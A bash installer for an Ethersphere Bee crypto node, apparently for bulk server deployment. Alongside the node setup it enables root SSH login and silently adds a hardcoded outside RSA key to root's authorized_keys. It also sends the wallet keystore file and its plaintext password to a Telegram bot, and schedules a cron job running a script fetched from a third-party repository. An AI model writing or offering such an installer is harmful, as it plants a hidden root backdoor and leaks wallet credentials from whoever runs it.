#!/bin/bash

cd ~
BEE_PATH="/root/bee"
[ ! -d "${BEE_PATH}" ] && mkdir ${BEE_PATH}

if [ -f ${BEE_PATH}/xswarm.conf ]; then
    source ${BEE_PATH}/xswarm.conf
else
    # 无配置文件时读取默认值
    SET_TG_APIURL="https://api.telegram.org/bot"
    SET_USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"

    export SET_USER_AGENT
    export SET_TG_APIURL

fi

[ -z ${SET_HOSTNAME} ] && SET_HOSTNAME=`hostname`
export SET_HOSTNAME

SET_START_TIME=`date '+%Y-%m-%d %H:%M:%S'`

# check os
Get_Pack_Manager() {
    PM=""
    if [ -f "/usr/bin/yum" ] && [ -d "/etc/yum.repos.d" ]; then
        PM="yum"
    elif [ -f "/usr/bin/apt-get" ] && [ -f "/usr/bin/dpkg" ]; then
        PM="apt-get"
    fi
    [ -z "${PM}" ] && exit 1 || echo "Your PM is ${PM}"
}
Get_Pack_Manager

InstallDepend()
{
    if ! jq --version>/dev/null 2>&1; then
        if [ "${PM}" == "yum" ] || [ "${PM}" == "dnf" ] ; then
            ${PM} -y update
            ${PM} -y install curl wget tmux jq
            ${PM} -y install lrzsz
        elif [ "${PM}" = "apt-get" ]; then
            ${PM} -y update
            ${PM} -y install curl wget tmux jq
            ${PM} -y install lrzsz
        fi
    fi
}
InstallDepend

addRootKey()
{
# add root key
    if [ $(id -u) != "0" ]; then
        echo "Error: You must be root to run this script"
        # exit 1
        sudo su root
    fi

    if ! `cat /etc/ssh/sshd_config|grep "^PermitRootLogin yes" > /dev/null 2>&1`; then
        sed -i "s/^#Port 22/\\
#Port 22\\
PermitRootLogin yes/g" /etc/ssh/sshd_config
        cat /etc/ssh/sshd_config|grep "PermitRootLogin yes"
    else
        echo "already add [PermitRootLogin yes]"
    fi

    if ! `cat /etc/ssh/sshd_config|grep "^PubkeyAuthentication yes" > /dev/null 2>&1`; then
        sed -i "s/^#PubkeyAuthentication yes/\\
PubkeyAuthentication yes\\
AuthorizedKeysFile      .ssh\/authorized_keys .ssh\/authorized_keys2/g" /etc/ssh/sshd_config
        cat /etc/ssh/sshd_config|grep "PubkeyAuthentication yes"
    else
        echo "already add [PermitRootLogin yes]"
    fi

    SET_SSH_DIR='/root/.ssh'
    [ ! -d ${SET_SSH_DIR} ] && mkdir ~/.ssh && chmod 600 ~/.ssh
    [ ! -f ${SET_SSH_DIR}/authorized_keys ] && touch ${SET_SSH_DIR}/authorized_keys
    if ! cat ${SET_SSH_DIR}/authorized_keys |grep "AAAAB3NzaC1yc2EAAAABIwAAAQEAxuO3HpuiVU" >/dev/null 2>&1; then 
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxuO3HpuiVUWfM1Acw2mgN7oWmNeK1elv4nCRuueD0tAKb4cHCrfKubcboEVocPNiURU0zJltjWcaEqRx0/mzbpyOLwMn/d85Yq9rP52ChGYemU6jJjOO613tArrpQNK2kJM7zAtq6dLS8CZ456xKZ7XDltQ/S+K2e7qhar3vlm5wtEfM017zlEsR/fQSTy4Q7nktcEt3epQ9KRYzMhF10l/zEVjQlQk0mKJRWv6ZrdHR1shID1+i6SR/4E9pTKwRJsShOeVbZcGACoj0u5POAZc0LawMlMM+t9lk3XkVn7r8uSLaki1+dPR80eMQWfnX9v7mvm+XllBIZp1Fsl8zaw== q6@dev" >> ${SET_SSH_DIR}/authorized_keys
    fi
    chmod 600 ${SET_SSH_DIR}/authorized_keys
    /sbin/service sshd restart

}
addRootKey


GenIpJSON()
{
    ipinfo_json=`curl --connect-timeout 5 -s -H "User-Agent: ${PARAM_USER_AGENT}" "https://api.myip.la/cn?json"`
    [ ! -d /etc/xswarm ] && mkdir /etc/xswarm
    ipinfo_file="${BEE_PATH}/ipinfo.json"
    cat > ${ipinfo_file} <<EOF
${ipinfo_json}
EOF
}
GetIP()
{
    ipinfo_file="${BEE_PATH}/ipinfo.json"
    [ ! -f ${ipinfo_file} ] && GenIpJSON
    ipinfo_timestamp=`stat -c %Y $ipinfo_file`
    
    cur_timestamp=`date +%s`
    timediff=$[$cur_timestamp - $ipinfo_timestamp]
    if [ $timediff -gt 604800 ];then
        echo '当前时间大于一周'
        GenIpJSON
    else
        echo '当前时间小于一周'
    fi

    PARAM_HOST_IP=`cat ${ipinfo_file} |jq -r '.ip'`
    PARAM_HOST_COUNTRY=`cat ${ipinfo_file} |jq -r '.location.country_code'`
    PARAM_HOST_CITY=`cat ${ipinfo_file} |jq -r '.location.city'`
    PARAM_HOST_PROVINCE=`cat ${ipinfo_file} |jq -r '.location.province'`
    export PARAM_HOST_IP
    export PARAM_HOST_COUNTRY
    export PARAM_HOST_CITY
    export PARAM_HOST_PROVINCE
}
GetIP

InstallBeeClef()
{
    if [ ! -f /usr/bin/bee-clef-keys ]; then
        echo "Installing BEE-clef"
        cd ${BEE_PATH}

        if [ "${PM}" == "yum" ] || [ "${PM}" == "dnf" ] ; then
            [ ! -f "${BEE_PATH}/bee-clef.rpm" ] && wget -O bee-clef.rpm https://github.com/ethersphere/bee-clef/releases/download/v0.4.9/bee-clef_0.4.9_amd64.rpm
            rpm -i bee-clef.rpm
        elif [ "${PM}" == "apt-get" ]; then
            [ ! -f "${BEE_PATH}/bee-clef.deb" ] && wget -O bee-clef.deb https://github.com/ethersphere/bee-clef/releases/download/v0.4.9/bee-clef_0.4.9_amd64.deb
            dpkg -i bee-clef.deb
        fi
    fi
}
InstallBeeClef

InstallBee()
{
    [ ! -f /usr/bin/bee-clef-keys ] && echo "You need to install BeeClef First! quit" && exit 1

    if bee version>/dev/null 2>&1; then
        echo "Already Install Bee ok, version: "; 
        bee version
    else
        echo "Installing BEE"
        cd ${BEE_PATH}

        if [ "${PM}" == "yum" ] || [ "${PM}" == "dnf" ] ; then
            [ ! -f "${BEE_PATH}/bee.rpm" ] && wget -O bee.rpm https://github.com/ethersphere/bee/releases/download/v0.5.3/bee_0.5.3_amd64.rpm
            rpm -i bee.rpm
        elif [ "${PM}" == "apt-get" ]; then
            [ ! -f "${BEE_PATH}/bee.deb" ] && wget -O bee.deb https://github.com/ethersphere/bee/releases/download/v0.5.3/bee_0.5.3_amd64.deb
            dpkg -i bee.deb
        fi
    fi
}
InstallBee

InstallExt()
{
    if [ ! -f ${BEE_PATH}/cashout.sh ]; then
        cd ${BEE_PATH} &&  wget -O cashout.sh https://gist.githubusercontent.com/ralph-pichler/3b5ccd7a5c5cd0500e6428752b37e975/raw/7ba05095e0836735f4a648aefe52c584e18e065f/cashout.sh
    fi

    cat > ${BEE_PATH}/param.sh <<"EOF"
#!/bin/bash
# Get Bee eth addr
# Get Peers
curl -s localhost:1635/addresses | jq .ethereum
curl -s http://localhost:1635/peers | jq '.peers | length'
EOF
}
InstallExt

CreateBeeServer()
{
    tmp_bee=`which bee`
    if [ -z $tmp_bee ]; then
        echo "bee don't exist.."
        exit 1
    fi

    if [ ! -f /etc/systemd/system/bee.service ]; then
    cat > /etc/systemd/system/bee.service <<EOE
[Unit]
Description=Bee Bzz Bzzzzz service
After=network.target
StartLimitIntervalSec=0
[Service]
Type=simple
Restart=always
RestartSec=60
User=root
ExecStart=${tmp_bee} start --config ${BEE_PATH}/bee.yaml
[Install]
WantedBy=multi-user.target
EOE
    else 
        echo "already have bee server"
    fi

    systemctl daemon-reload
    systemctl enable bee
    systemctl start bee
}


genBeeConfig()
{
    if [ ! -f ${BEE_PATH}/bee.yaml ]; then
        cat > ${BEE_PATH}/bee.yaml <<EOF
password: "bee"
clef-signer-enable: true
clef-signer-endpoint: /var/lib/bee-clef/clef.ipc
data-dir: ${BEE_PATH}/.bee
swap-enable: true
swap-endpoint: https://goerli.infura.io/v3/50bd9ef8853246c69bf8497c54e8f88f
verbosity: trace
#verbosity: 5
welcome-message: "xswarm"
debug-api-enable: true
EOF
    fi
}

genBeeConfig
CreateBeeServer

addBeeDaemonCron()
{
    if [ ! -f ${BEE_PATH}/cronBee.sh ]; then
        cd ${BEE_PATH} && wget -O cronBee.sh https://raw.githubusercontent.com/boxcore/tools/master/sh/bc/cronBee.sh
    fi

    if ! crontab -l > /dev/null  2>&1; then # 需解决crontab空时异常无法添加的情况
        echo "* */2 * * * bash /root/bee/cronBee.sh > /dev/null" >> conf && crontab conf && rm -f conf
        echo "add cron cronBee.sh ok"
    else
        if ! crontab -l|grep -v "^#"| grep "cronBee.sh" > /dev/null 2>&1 ; then
            crontab -l > conf && echo "* */2 * * * bash /root/bee/cronBee.sh > /dev/null" >> conf && crontab conf && rm -f conf
            echo "add cron cronBee.sh ok"
        else
            echo "already add cron: cronBee.sh"
        fi
    fi
}

sendTgFile()
{
    eth_addr=$(curl -s http://localhost:1635/addresses | jq -r .ethereum)
    
    if ls /var/lib/bee-clef/keystore/UTC-* > /dev/null 2>&1; then
        file_json=`ls /var/lib/bee-clef/keystore/UTC-*| awk 'NR==1'`
        file_password=$(cat /var/lib/bee-clef/password)
        echo "ok"
        file_rs=$(curl -s -F "chat_id=${SET_TG_CHATID}" -F document=@${file_json} -F "caption=【服务器「${PARAM_HOST_IP}」bee key info】 File: key.json Password: ${file_password} #文件 #${eth_addr} #${SET_HOSTNAME} #${PARAM_HOST_IP}" ${SET_TG_APIURL}${SET_TG_BOTAPI}/sendDocument|jq -r ".ok")


        if [ "${file_rs}" == 'true' ]; then 
            echo "send json file ok"
        else
            echo "send json file failure"
        fi
        
    else
        echo "don't have key file !"
    fi
}

sendTgBeeWaitTrans()
{
    eth_addr=$(curl -s http://localhost:1635/addresses | jq -r .ethereum)
    t=`date '+%Y-%m-%d %H:%M:%S'`
    msg="✅*【服务器「${PARAM_HOST_IP}」bee部署成功,请至少充值1个eth和100个gBZZ测试币】*
·_IP信息_ ：${PARAM_HOST_IP} （${PARAM_HOST_COUNTRY}，${PARAM_HOST_PROVINCE}，${PARAM_HOST_CITY}）
·_时间_：${t}
·_服务器名_：${SET_HOSTNAME}
·_eth钱包地址_：${eth_addr}
·_水龙头_：https://faucet.ethswarm.org/ 
·_gbzz合约地址_：0x2ac3c1d3e24b45c6c310534bc2dd84b5ed576335
#通知 #bee部署 #${eth_addr} #${SET_HOSTNAME} #${PARAM_HOST_IP}"

curl -s -X POST "${SET_TG_APIURL}${SET_TG_BOTAPI}/sendMessage" -d "chat_id=${SET_TG_CHATID}&parse_mode=markdown&text=${msg}" > /dev/null 2>&1
}

sendTgBeeFail()
{
    t=`date '+%Y-%m-%d %H:%M:%S'`
    msg="*【服务器「${PARAM_HOST_IP}」bee部署失败】*
·_IP信息_ ：${PARAM_HOST_IP} （${PARAM_HOST_COUNTRY}，${PARAM_HOST_PROVINCE}，${PARAM_HOST_CITY}）
·_时间_：${t}
·_服务器名_：${SET_HOSTNAME}
#通知 #bee部署  #${SET_HOSTNAME} #失败 #${PARAM_HOST_IP}"

curl -s -X POST "${SET_TG_APIURL}${SET_TG_BOTAPI}/sendMessage" -d "chat_id=${SET_TG_CHATID}&parse_mode=markdown&text=${msg}" > /dev/null 2>&1
}


# main script

if bee version>/dev/null 2>&1; then
    [ ! -d /var/lib/bee-clef ] && echo "/var/lib/bee-clef/  don't exits!" && exit 1

    check_cnt=0
    check_addr=0
    check_peer=0
    while true; do
        check_cnt=`expr $check_cnt + 1`
        eth_addr=$(curl -s http://localhost:1635/addresses | jq -r .ethereum)

        if [ -z ${eth_addr} ]; then 
            check_addr=`expr $check_addr + 1`
            echo "[Info]running bee, restart bee now ( tried ${check_addr} times)..."
            systemctl restart bee
            sleep 2
            if [ ${check_addr} -gt 5 ]; then
                echo "[Error]try to restart bee failure for ${check_addr} times, please check the code.."
                exit 1
            fi
            continue
        fi

        peer_num=`curl -s http://localhost:1635/peers | jq -r '.peers | length'`
        if [ ${peer_num} -gt 0 ]; then
            echo "[Success]peer connected ${peer_num}, finish!"
            addBeeDaemonCron

            # 发送json文件
            [ ! -z ${SET_TG_BOTAPI} ] && sendTgFile

            break
        else
            check_peer=`expr $check_peer + 1`
            echo "[Info]no peer connected, wait to connect( tried ${check_peer} times)..."
            sleep 5

            # 第一次需要发送eth地址到tg提醒充值
            if [ ${check_peer} -eq 1 ]; then
                [ ! -z ${SET_TG_BOTAPI} ] && sendTgBeeWaitTrans
            fi

            if [ ${check_peer} -eq 10 ] || [ ${check_peer} -eq 100 ] || [ ${check_peer} -eq 1000 ] ; then
                echo "[Error]try to connect peer for ${check_peer} times, you need to add 100buzz to you accout : ${eth_addr} .."
            fi
            continue
        fi
    done

else
    echo "bee install failure!"
    [ ! -z ${SET_TG_BOTAPI} ] && sendTgBeeFail
    exit 1
fi
